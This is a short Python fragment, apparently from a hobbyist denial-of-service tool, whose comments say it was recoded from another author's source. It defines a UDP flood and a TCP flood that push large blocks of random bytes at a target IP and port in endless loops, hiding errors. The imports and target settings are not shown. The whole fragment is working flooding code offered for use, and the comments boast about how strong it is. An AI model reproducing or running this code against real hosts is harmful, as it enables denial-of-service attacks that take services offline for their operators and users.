#Source are not made by me i only recode it also i forgot who made thats source.
#and also that urandom very strong asf especially TCP.
#Note: do not sell it.

def run1(): #Udp-flood

	data = random._urandom(60000)
	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			

		except:

			print()



def run2(): #TCP FLOOD

	data = random._urandom(102400) #10240 10425 600000

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

                

				s.send(data)

		except:

            

		    s.close()
